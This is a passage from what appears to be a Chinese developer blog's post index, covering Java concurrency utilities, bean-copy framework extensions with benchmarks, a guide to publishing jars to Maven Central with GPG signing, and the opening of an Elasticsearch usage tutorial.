System.out.printf(\"结束\");} 1.7 栅栏 CyclicBarrierCyclicBarrier的作用与上面的CountDownLatch相似，区别在于正向计数+1, 只有达到条件才放行; 且支持通过调用reset()重置计数，而CountDownLatch则不行 一个简单的demo 123456789101112131415161718192021222324252627private void cyclicBarrierLogic(CyclicBarrier barrier, long sleep) { // 等待达到条件才放行 try { System.out.println(\"准备执行: \" + Thread.currentThread() + \" at: \" + LocalDateTime.now()); Thread.sleep(sleep); int index = barrier.await(); System.out.println(\"开始执行: \" + index + \" thread: \" + Thread.currentThread() + \" at: \" + LocalDateTime.now()); } catch (Exception e) { e.printStackTrace(); }}@Testpublic void testCyclicBarrier() throws InterruptedException { // 到达两个工作线程才能继续往后面执行 CyclicBarrier barrier = new CyclicBarrier(2); // 三秒之后，下面两个线程的才会输出 开始执行 new Thread(() -&gt; cyclicBarrierLogic(barrier, 1000)).start(); new Thread(() -&gt; cyclicBarrierLogic(barrier, 3000)).start(); Thread.sleep(4000); // 重置，可以再次使用 barrier.reset(); new Thread(() -&gt; cyclicBarrierLogic(barrier, 1)).start(); new Thread(() -&gt; cyclicBarrierLogic(barrier, 1)).start(); Thread.sleep(10000);} 1.8 guava令牌桶guava封装了非常简单的并发控制工具类RateLimiter，作为单机的并发控制首选 一个控制qps为2的简单demo如下: 12345678910111213141516171819202122232425private void guavaProcess(RateLimiter rateLimiter) { try { // 同步阻塞方式获取 System.out.println(\"准备执行: \" + Thread.currentThread() + \" &gt; \" + LocalDateTime.now()); rateLimiter.acquire(); System.out.println(\"执行中: \" + Thread.currentThread() + \" &gt; \" + LocalDateTime.now()); } catch (Exception e) { e.printStackTrace(); }}@Testpublic void testGuavaRate() throws InterruptedException { // 1s 中放行两个请求 RateLimiter rateLimiter = RateLimiter.create(2.0d); new Thread(() -&gt; guavaProcess(rateLimiter)).start(); new Thread(() -&gt; guavaProcess(rateLimiter)).start(); new Thread(() -&gt; guavaProcess(rateLimiter)).start(); new Thread(() -&gt; guavaProcess(rateLimiter)).start(); new Thread(() -&gt; guavaProcess(rateLimiter)).start(); new Thread(() -&gt; guavaProcess(rateLimiter)).start(); new Thread(() -&gt; guavaProcess(rateLimiter)).start(); Thread.sleep(20_000);} 输出: 1234567891011121314准备执行: Thread[Thread-2,5,main] &gt; 2021-04-13T10:18:05.263准备执行: Thread[Thread-1,5,main] &gt; 2021-04-13T10:18:05.263准备执行: Thread[Thread-5,5,main] &gt; 2021-04-13T10:18:05.264准备执行: Thread[Thread-7,5,main] &gt; 2021-04-13T10:18:05.264准备执行: Thread[Thread-3,5,main] &gt; 2021-04-13T10:18:05.263准备执行: Thread[Thread-4,5,main] &gt; 2021-04-13T10:18:05.264准备执行: Thread[Thread-6,5,main] &gt; 2021-04-13T10:18:05.263执行中: Thread[Thread-2,5,main] &gt; 2021-04-13T10:18:05.267执行中: Thread[Thread-6,5,main] &gt; 2021-04-13T10:18:05.722执行中: Thread[Thread-4,5,main] &gt; 2021-04-13T10:18:06.225执行中: Thread[Thread-3,5,main] &gt; 2021-04-13T10:18:06.721执行中: Thread[Thread-7,5,main] &gt; 2021-04-13T10:18:07.221执行中: Thread[Thread-5,5,main] &gt; 2021-04-13T10:18:07.720执行中: Thread[Thread-1,5,main] &gt; 2021-04-13T10:18:08.219 1.9 滑动窗口TimeWindow没有找到通用的滑动窗口jar包，一般来讲滑动窗口更适用于平滑的限流，解决瞬时高峰问题 一个供参考的实现方式： 固定大小队列，队列中每个数据代表一个时间段的计数， 访问 -》 队列头拿数据（注意不出队）-》判断是否跨时间段 -》 同一时间段，计数+1 -》跨时间段，新增数据入队，若扔不进去，表示时间窗满，队尾数据出队 问题：当流量稀疏时，导致不会自动释放过期的数据解决方案：根据时间段设置定时任务，模拟访问操作，只是将计数改为 + 0 1.10 小结本文给出了几种单机版的并发控制的技术手段，主要目的是介绍了一些可选的方案，技术细节待后续补全完善，当然如果有其他的建议，欢迎评论交流 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/04/12/210412-JDK-常见并发控制手段/"},{"title":"210408-常见Bean拷贝框架下划线驼峰互转扩展支持","text":"上一篇博文介绍了几种bean拷贝框架的使用姿势以及性能对比，主要适用的是属性名一致、类型一致的拷贝，在实际的业务开发中，经常会用到驼峰和下划线的互转，本文在之前的基础上进行扩展 cglib hutool I. 驼峰下划线拷贝支持上面的使用都是最基本的使用姿势，属性名 + 类型一致，都有getter/setter方法，我们实际的业务场景中，有一个比较重要的地方，就是下划线与驼峰的转换支持，如果要使用上面的框架，可以怎样适配? 1. cglib 下划线转驼峰spring cglib封装 与 纯净版的cglib 实现逻辑差别不大，主要是spring里面做了一些缓存，所以表现会相对好一点；为了更加通用，这里以纯净版的cglib进行扩展演示 cglib实现转换的核心逻辑在 net.sf.cglib.beans.BeanCopier.Generator.generateClass 123456789101112131415161718192021222324public void generateClass(ClassVisitor v) { // ... 省略无关代码 PropertyDescriptor[] getters = ReflectUtils.getBeanGetters(source); PropertyDescriptor[] setters = ReflectUtils.getBeanSetters(target); // 扫描source的所有getter方法，写入到map， key为属性名; // 为了支持驼峰，下划线，我们可以扩展一下这个map，如果属性名为下划线的，额外加一个驼峰的kv进去 Map names = new HashMap(); for (int i = 0; i &lt; getters.length; i++) { names.put(getters[i].getName(), getters[i]); } // ... for (int i = 0; i &lt; setters.length; i++) { PropertyDescriptor setter = setters[i]; // 这里根据target的属性名，获取source对应的getter方法，同样适配一下，如果下划线格式的获取不到，则改用驼峰的试一下 PropertyDescriptor getter = (PropertyDescriptor)names.get(setter.getName()); if (getter != null) { // .... } } // ...} 改造逻辑，上面的注释中已经贴出来了，核心实现就比较简单了 提供一个下划线转驼峰的工具了 StrUtil 1234567891011121314151617181920212223242526272829303132333435363738394041public class StrUtil { private static final char UNDER_LINE = '_'; /** * 下划线转驼峰 * * @param name * @return */ public static String toCamelCase(String name) { if (null == name || name.length() == 0) { return null; } if (!contains(name, UNDER_LINE)) { return name; } int length = name.length(); StringBuilder sb = new StringBuilder(length); boolean underLineNextChar = false; for (int i = 0; i &lt; length; ++i) { char c = name.charAt(i); if (c == UNDER_LINE) { underLineNextChar = true; } else if (underLineNextChar) { sb.append(Character.toUpperCase(c)); underLineNextChar = false; } else { sb.append(c); } } return sb.toString(); } public static boolean contains(String str, char searchChar) { return str.indexOf(searchChar) &gt;= 0; }} 然后自定义一个 PureCglibBeanCopier, 将之前BeanCopier的代码都拷贝进来，然后改一下上面注释的两个地方 (完整的代码参考项目源码) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public void generateClass(ClassVisitor v) { // ... 省略无关代码 PropertyDescriptor[] setters = ReflectUtils.getBeanSetters(target); // 扫描source的所有getter方法，写入到map， key为属性名; // 为了支持驼峰，下划线，我们可以扩展一下这个map，如果属性名为下划线的，额外加一个驼峰的kv进去 Map&lt;String, PropertyDescriptor&gt; names = buildGetterNameMapper(source) // ... for (int i = 0; i &lt; setters.length; i++) { PropertyDescriptor setter = setters[i]; // 这里根据target的属性名，获取source对应的getter方法，同样适配一下，如果下划线格式的获取不到，则改用驼峰的试一下 PropertyDescriptor getter = loadSourceGetter(names, setter); if (getter != null) { // .... } } // ...}/** * 获取目标的getter方法，支持下划线与驼峰 * * @param source * @return */public Map&lt;String, PropertyDescriptor&gt; buildGetterNameMapper(Class source) { PropertyDescriptor[] getters = org.springframework.cglib.core.ReflectUtils.getBeanGetters(source); Map&lt;String, PropertyDescriptor&gt; names = new HashMap&lt;&gt;(getters.length); for (int i = 0; i &lt; getters.length; ++i) { String name = getters[i].getName(); String camelName = StrUtil.toCamelCase(name); names.put(name, getters[i]); if (!name.equalsIgnoreCase(camelName)) { // 支持下划线转驼峰 names.put(camelName, getters[i]); } } return names;}/** * 根据target的setter方法，找到source的getter方法，支持下划线与驼峰的转换 * * @param names * @param setter * @return */public PropertyDescriptor loadSourceGetter(Map&lt;String, PropertyDescriptor&gt; names, PropertyDescriptor setter) { String setterName = setter.getName(); return names.getOrDefault(setterName, names.get(StrUtil.toCamelCase(setterName)));} 使用姿势和之前没有什么区别，就是BeanCopier的创建这里稍稍修改一下即可（BeanCopier可以加缓存，避免频繁的创建） 1234567public &lt;K, T&gt; T copyAndParse(K source, Class&lt;T&gt; target) throws IllegalAccessException, InstantiationException { // todo copier 可以缓存起来，避免每次重新创建 BeanCopier copier = PureCglibBeanCopier.create(source.getClass(), target, false); T res = target.newInstance(); copier.copy(source, res, null); return res;} 2. hutool 下划线转驼峰hutool也支持下划线与驼峰的互转，而且不需要修改源码， 只用我们自己维护一个FieldMapper即可，改动成本较小；而且在map2bean, bean2map时，可以无修改的实现驼峰下划线互转，这一点还是非常很优秀的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * 驼峰转换 * * @param source * @param target * @param &lt;K&gt; * @param &lt;T&gt; * @return */public &lt;K, T&gt; T copyAndParse(K source, Class&lt;T&gt; target) throws Exception { T res = target.newInstance(); // 下划线转驼峰 BeanUtil.copyProperties(source, res, getCopyOptions(source.getClass())); return res;}// 缓存CopyOptions（注意这个是HuTool的类，不是Cglib的）private Map&lt;Class, CopyOptions&gt; cacheMap = new HashMap&lt;&gt;();private CopyOptions getCopyOptions(Class source) { CopyOptions options = cacheMap.get(source); if (options == null) { // 不加锁，我们认为重复执行不会比并发加锁带来的开销大 options = CopyOptions.create().setFieldMapping(buildFieldMapper(source)); cacheMap.put(source, options); } return options;}/** * @param source * @return */private Map&lt;String, String&gt; buildFieldMapper(Class source) { PropertyDescriptor[] properties = ReflectUtils.getBeanProperties(source); Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); for (PropertyDescriptor target : properties) { String name = target.getName(); String camel = StrUtil.toCamelCase(name); if (!name.equalsIgnoreCase(camel)) { map.put(name, camel); } String under = StrUtil.toUnderlineCase(name); if (!name.equalsIgnoreCase(under)) { map.put(name, under); } } return map;} 3. mapstruct最后再介绍一下MapStruct，虽然我们需要手动编码来实现转换，但是好处是性能高啊，既然已经手动编码了，那也就不介意补上下划线和驼峰的转换了 12345@Mappings({ @Mapping(target = \"userName\", source = \"user_name\"), @Mapping(target = \"market_price\", source = \"marketPrice\")})Target2 copyAndParse(Source source); 4. 测试接下来测试一下上面三个是否能正常工作 定义一个Target2，注意它与Source有两个字段不同，分别是 user_name/userName, marketPrice/market_price 1234567891011121314151617@Datapublic class Target2 { private Integer id; private String userName; private Double price; private List&lt;Long&gt; ids; private BigDecimal market_price;}private void camelParse() throws Exception { Source s = genSource(); Target2 cglib = springCglibCopier.copyAndParse(s, Target2.class); Target2 cglib2 = pureCglibCopier.copyAndParse(s, Target2.class); Target2 hutool = hutoolCopier.copyAndParse(s, Target2.class); Target2 map = mapsCopier.copy(s, Target2.class); System.out.println(\"source:\" + s + \"\\nsCglib:\" + cglib + \"\\npCglib:\" + cglib2 + \"\\nhuTool:\" + hutool + \"\\nMapStruct:\" + map);} 输出结果如下 12345source:Source(id=527180337, user_name=一灰灰Blog, price=7.9, ids=[-2509965589596742300, 5995028777901062972, -1914496225005416077], marketPrice=0.35188996791839599609375)sCglib:Target2(id=527180337, userName=一灰灰Blog, price=7.9, ids=[-2509965589596742300, 5995028777901062972, -1914496225005416077], market_price=0.35188996791839599609375)pCglib:Target2(id=527180337, userName=一灰灰Blog, price=7.9, ids=[-2509965589596742300, 5995028777901062972, -1914496225005416077], market_price=0.35188996791839599609375)huTool:Target2(id=527180337, userName=一灰灰Blog, price=7.9, ids=[-2509965589596742300, 5995028777901062972, -1914496225005416077], market_price=0.35188996791839599609375)MapStruct:Target2(id=527180337, userName=一灰灰Blog, price=7.9, ids=[-2509965589596742300, 5995028777901062972, -1914496225005416077], market_price=0.35188996791839599609375) 性能测试 12345678910private &lt;T&gt; void autoCheck2(Class&lt;T&gt; target, int size) throws Exception { StopWatch stopWatch = new StopWatch(); runCopier(stopWatch, \"apacheCopier\", size, (s) -&gt; apacheCopier.copy(s, target)); runCopier(stopWatch, \"springCglibCopier\", size, (s) -&gt; springCglibCopier.copyAndParse(s, target)); runCopier(stopWatch, \"pureCglibCopier\", size, (s) -&gt; pureCglibCopier.copyAndParse(s, target)); runCopier(stopWatch, \"hutoolCopier\", size, (s) -&gt; hutoolCopier.copyAndParse(s, target)); runCopier(stopWatch, \"springBeanCopier\", size, (s) -&gt; springBeanCopier.copy(s, target)); runCopier(stopWatch, \"mapStruct\", size, (s) -&gt; mapsCopier.copyAndParse(s, target)); System.out.println((size / 10000) + \"w -------- cost: \" + stopWatch.prettyPrint());} 对比结果如下，虽然cglib, hutool 支持了驼峰,下划线的互转，最终的表现和上面的也没什么太大区别 12345678910111213141516171819202122232425262728293031323334353637383940414243441w -------- cost: StopWatch '': running time = 754589100 ns---------------------------------------------ns % Task name---------------------------------------------572878100 076% apacheCopier yihui017037900 002% springCglibCopier031207500 004% pureCglibCopier105254600 014% hutoolCopier022156300 003% springBeanCopier006054700 001% mapStruct1w -------- cost: StopWatch '': running time = 601845500 ns---------------------------------------------ns % Task name---------------------------------------------494895600 082% apacheCopier009014500 001% springCglibCopier008998600 001% pureCglibCopier067145800 011% hutoolCopier016557700 003% springBeanCopier005233300 001% mapStruct10w -------- cost: StopWatch '': running time = 5543094200 ns---------------------------------------------ns % Task name---------------------------------------------4474871900 081% apacheCopier089066500 002% springCglibCopier090526400 002% pureCglibCopier667986400 012% hutoolCopier166274800 003% springBeanCopier054368200 001% mapStruct50w -------- cost: StopWatch '': running time = 27527708400 ns---------------------------------------------ns % Task name---------------------------------------------22145604900 080% apacheCopier452946700 002% springCglibCopier448455700 002% pureCglibCopier3365908800 012% hutoolCopier843306700 003% springBeanCopier271485600 001% mapStruct II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 项目源码: https://github.com/liuyueyi/spring-boot-demo/tree/master/spring-boot/004-bean-util 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/04/08/210408-常见Bean拷贝框架下划线驼峰互转扩展支持/"},{"title":"201128-Maven 中央仓库提交Jar包全程指南","text":"本文记录一下将jar上传到maven中央仓库的全过程，文中项目依托在github上，使用的是mac环境 (关于maven、jdk的环境配置不属于本文内容) 1. sonatype账号申请首先我们需要申请一个账号，地址为： https://issues.sonatype.org/secure/Signup!default.jspa 请记住这个账号的用户名 + 密码，在后续的maven的setting.xml配置文件中需要用到 账号申请完毕之后，点击新建按钮（如果是因为的话，就是create），提交一个issue 项目：选择Community Support - Open Source Project Repository Hosting (OSSRH) 问题类型：选择New Project 概要：项目说明 描述：项目说明 GroupId: 请注意，对于github项目而言，前缀都是com.github，后面跟着的是你的账号名，比如我的账号是liuyueyi，所以我的groupId是 com.github.liuyueyi，如果不满足这个规则将无法通过后续的审核 Project URL: 项目地址，填对应的github连接 https://github.com/liuyueyi/quick-chinese-transfer SCM URL: 和上面的基本一致，只是多了一个.git 基本上需要配置的东西如下图，最后点击新建即可 上面提交之后，等待审核即可 2. GPG安装在后续的上传jar包时，需要利用gpg进行签名，下面介绍一下mac的安装流程 推荐用法 macos安装可以借助homebrew来实现 1brew install gpg 备选方案 但是我的mac系统比较老，使用上面的方式安装失败，直接抛了异常，根据搜索结果来看，不升级系统貌似没有什么好的解决办法 下面是采用安装包的方式，原则上建议到官网去下载安装包，依然是因为版本问题，最新的我也安装不上，所以找了一个历史的下载网址，(不保证这个网站上的安装包的安全性。虽然我自己用的也是它) 如有需要，可以跳转: https://sourceforge.net/p/gpgosx/docu/Download/ 我选择的是2.2.12版本，安装完毕之后，可以查看一下里面的readme文件，查看具体的安装路径 比如在我的电脑上安装路径为: /usr/local/gnupg-2.2/bin，为了方便使用，可以设置一下环境 123456vim ~/.bash_profile# 添加新的path路径PATH=$PATH:/usr/local/gnupg-2.2/binsource ~/.bash_profile 密钥生成及发布 安装完毕之后，设置我们自己的密钥 123# 生成密钥对# 输入用户名 + 邮箱，请记住这个密码，后面上传jar包的时候会用到gpg --gen-key 查看本地密钥 12# 生成完毕之后，查看本地密钥gpg --list-keys 上图中勾住的就是我们的公钥id，接下来将公钥id上传到密钥服务器 12345## 上传公钥gpg --keyserver hkp://keyserver.ubuntu.com:11371 --send-keys 公钥ID## 查看公钥上传情况gpg --keyserver hkp://keyserver.ubuntu.com:11371 --recv-keys 公钥ID 3. maven配置接下来，我们需要设置一下我们的maven配置文件setting.xml，将我们的用户信息填写进去 1vim ~/.m2/setting.xml 添加第一步中申请的账号信息，（用户名+密码就是第一步申请的账号密码) 123456789# 添加账号信息&lt;servers&gt; &lt;server&gt; &lt;id&gt;ossrh&lt;/id&gt; &lt;username&gt;user&lt;/username&gt; &lt;password&gt;password&lt;/password&gt; &lt;/server&gt;&lt;/servers&gt; 4. 项目配置前面的步骤属于大的环境相关，接下来就需要在我们的实际项目中，配置必要的信息了，这里以https://github.com/liuyueyi/quick-chinese-transfer的配置为实例进行说明 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.github.liuyueyi&lt;/groupId&gt; &lt;artifactId&gt;quick-chinese-transfer&lt;/artifactId&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;version&gt;0.1&lt;/version&gt; &lt;modules&gt; &lt;module&gt;transfer-core&lt;/module&gt; &lt;/modules&gt; &lt;name&gt;quick-chinese-transfer&lt;/name&gt; &lt;description&gt; A Java library supporting conversion between Simplified-Chinese, Traditional-Chinese &lt;/description&gt; &lt;url&gt;https://github.com/liuyueyi/quick-chinese-transfer&lt;/url&gt; &lt;licenses&gt; &lt;license&gt; &lt;name&gt;The Apache Software License, Version 2.0&lt;/name&gt; &lt;url&gt;http://www.apache.org/licenses/LICENSE-2.0.txt&lt;/url&gt; &lt;distribution&gt;repo&lt;/distribution&gt; &lt;/license&gt; &lt;/licenses&gt; &lt;issueManagement&gt; &lt;system&gt;github&lt;/system&gt; &lt;url&gt;https://github.com/liuyueyi/quick-chinese-transfer/issues&lt;/url&gt; &lt;/issueManagement&gt; &lt;scm&gt; &lt;connection&gt;scm:git:https://github.com/liuyueyi/quick-chinese-transfer.git&lt;/connection&gt; &lt;developerConnection&gt;scm:git:https://github.com/liuyueyi/quick-chinese-transfer.git&lt;/developerConnection&gt; &lt;url&gt;https://github.com/liuyueyi/quick-chinese-transfer&lt;/url&gt; &lt;/scm&gt; &lt;developers&gt; &lt;developer&gt; &lt;name&gt;YiHui&lt;/name&gt; &lt;email&gt;bangzewu@126.com&lt;/email&gt; &lt;url&gt;http://blog.hhui.top&lt;/url&gt; &lt;/developer&gt; &lt;/developers&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;build&gt; &lt;pluginManagement&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-release-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;mavenExecutorId&gt;forked-path&lt;/mavenExecutorId&gt; &lt;useReleaseProfile&gt;false&lt;/useReleaseProfile&gt; &lt;arguments&gt;-Psonatype-oss-release&lt;/arguments&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;inherited&gt;true&lt;/inherited&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;attach-sources&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;jar&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;excludeResources&gt;true&lt;/excludeResources&gt; &lt;useDefaultExcludes&gt;true&lt;/useDefaultExcludes&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-javadoc-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;inherited&gt;true&lt;/inherited&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;bundle-sources&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;jar&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;maxmemory&gt;1024&lt;/maxmemory&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;show&gt;protected&lt;/show&gt; &lt;notree&gt;true&lt;/notree&gt; &lt;!-- Avoid running into Java 8's very restrictive doclint issues --&gt; &lt;failOnError&gt;false&lt;/failOnError&gt; &lt;doclint&gt;none&lt;/doclint&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/pluginManagement&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt; &lt;artifactId&gt;cobertura-maven-plugin&lt;/artifactId&gt; &lt;version&gt;2.7&lt;/version&gt; &lt;configuration&gt; &lt;formats&gt; &lt;format&gt;html&lt;/format&gt; &lt;format&gt;xml&lt;/format&gt; &lt;/formats&gt; &lt;check/&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;configuration&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-javadoc-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;distributionManagement&gt; &lt;repository&gt; &lt;id&gt;ossrh&lt;/id&gt; &lt;url&gt;https://oss.sonatype.org/service/local/staging/deploy/maven2/&lt;/url&gt; &lt;/repository&gt; &lt;snapshotRepository&gt; &lt;id&gt;ossrh&lt;/id&gt; &lt;url&gt;https://oss.sonatype.org/content/repositories/snapshots&lt;/url&gt; &lt;/snapshotRepository&gt; &lt;/distributionManagement&gt; &lt;profiles&gt; &lt;profile&gt; &lt;id&gt;release&lt;/id&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-gpg-plugin&lt;/artifactId&gt; &lt;version&gt;1.6&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;sign-artifacts&lt;/id&gt; &lt;phase&gt;verify&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;sign&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/profile&gt; &lt;/profiles&gt;&lt;/project&gt; 上面是一个完整的配置信息，其中，非常核心的几个点 groupId: 请注意与申请的保持一致 plugins: 我们上传的jar包，需要包含doc和源码，所以maven-source-plugin + maven-javadoc-plugin必不可少 maven-gpg-plugin: 签名的插件，必要 在我的实际项目开发过程中，这里遇到了一个问题，maven-gpg-plugin下载不下来一直标红，如果遇到这种问题，可以定向下载 1mvn dependency:get -DrepoUrl=http://repo.maven.apache.org/maven2/ -Dartifact=org.apache.maven.plugins:maven-gpg-plugin:1.6 除此之外，还可以通过idea设置 -&gt; maven -&gt; Repositories 更新依赖 上面这个配置完毕之后，就是打包上传，直接使用以下命令即可 1mvn clean deploy -DskipTests=true -P release 这个命令执行过程中，会弹出一个输入gpg密码的弹窗，输入我们第二步中生成gpg密钥时，填写的密码即可 jar包上传完毕之后，就可以在https://oss.sonatype.org/看到了 注意 当我们第一步提交的issues审核之后，会有一个邮件通知你，可以发布对应的jar包了，也可以在issues看到下面的回复，一般有下面两步 提示你在github上创建一个权限验证的空的仓库 创建完毕之后，改变issue状态 提示你可以上传jar包了 接着执行上面的jar包发布 5. jar包发布接下来登录 https://oss.sonatype.org/#stagingRepositories 管理我们上传的jar包 点击 Staging Repositories 选中我们需要发布的jar 点击close close点击完毕之后，如果一切正常，那么等待一段时间之后，就可以发现release按钮可以点击了，然后点击release发布即可 如果一切顺利，我们会收到一个邮件，告诉我们发布成功，准备同步jar包了 然后等十来分钟，就可以直接依赖导入jar包了 12345&lt;dependency&gt; &lt;groupId&gt;com.github.liuyueyi&lt;/groupId&gt; &lt;artifactId&gt;quick-transfer-core&lt;/artifactId&gt; &lt;version&gt;0.1&lt;/version&gt;&lt;/dependency&gt; 注意 关于上面这个发布，有可能没有那么顺利，比如我之前遇到了几个问题，点击选中包的Activites可以查看失败的原因 上面几个问题的原因主要在于项目的pom配置有问题，导致上传的包没有签名，没有source, java-doc 其次还遇到过一次说是gpg密钥没有找到的问题，这个有可能是因为我们上传的密钥还没有同步过去，有延迟，再试一次就可以了 5. 小结虽然网上挺多这种教程，但是在实际的操作中，总会遇到一些别人没有遇到的问题，当然如果没有遇到问题，那当然是最幸运的事情了；本文主要是为了记录jar包上传的中央仓库的全过程，做一个归纳小结，也方便后续的查阅，当然如果对其他的小伙伴能有所帮助也是不错的 在写本文的时候，已经可以在中央仓库搜索到上传的jar包了 参考文档 将项目发布到 maven 中央仓库踩过的坑 如何提交项目到Maven中央仓库（图文详解） II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/11/28/201128-Maven-中央仓库提交Jar包全程指南/"},{"title":"210331-ElasticSearch 基本使用姿势","text":"ElasticSearch 基本使用姿势，如常见的 添加文档 常见的查询姿势 修改/删除文档 1. 添加文档首次添加文档时，若索引不存在会自动创建； 借助kibana的dev-tools来实现es的交互 1234567891011121314151617181920212223242526272829303132POST first-index/_doc{ \"@timestamp\": \"2021-03-31T01:12:00\", \"message\": \"GET /search HTTP/1.1 200 1070000\", \"user\": { \"id\": \"YiHui\", \"name\": \"一灰灰Blog\" }, \"addr\": { \"country\": \"cn\", \"province\": \"hubei\", \"city\": \"wuhan\" }, \"age\": 18}## 添加两个数据进行测试POST first-index/_doc{ \"@timestamp\": \"2021-03-31T02:12:00\", \"message\": \"GET /search HTTP/1.1 200 1070000\", \"user\": { \"id\": \"ErHui\", \"name\": \"二灰灰Blog\" }, \"addr\": { \"country\": \"cn\", \"province\": \"hubei\", \"city\": \"wuhan\" }, \"age\": 19} 当然也可以直接使用http进行交互，下面的方式和上面等价（后面都使用kibanan进行交互，更直观一点） 123456789101112131415curl -X POST 'http://localhost:9200/first-index/_doc?pretty' -H 'Content-Type: application/json' -d '{ \"@timestamp\": \"2021-03-31T01:12:00\", \"message\": \"GET /search HTTP/1.1 200 1070000\", \"user\": { \"id\": \"YiHui\", \"name\": \"一灰灰Blog\" }, \"addr\": { \"country\": \"cn\", \"province\": \"hubei\", \"city\": \"wuhan\" }, \"age\": 18}' 2. 查询文档2.0 kibana配置并查询除了基础的查询语法之外，直接使用kibana进行查询，对于使用方而言，门槛最低；首先配置上面的es索引 Management -&gt; Stack Management -&gt; Kiabana Index Patterns index pattern name 时间字段，选择 @timestamp 这个与实际的文档中的field有关 接下来进入Discover 进行查询 比如字段查询 2.1 查询所有不加任何匹配，捞出文档(当数据量很多时，当然也不会真的全部返回，也是会做分页的) 1234567GET my-index/_search{ \"query\": { 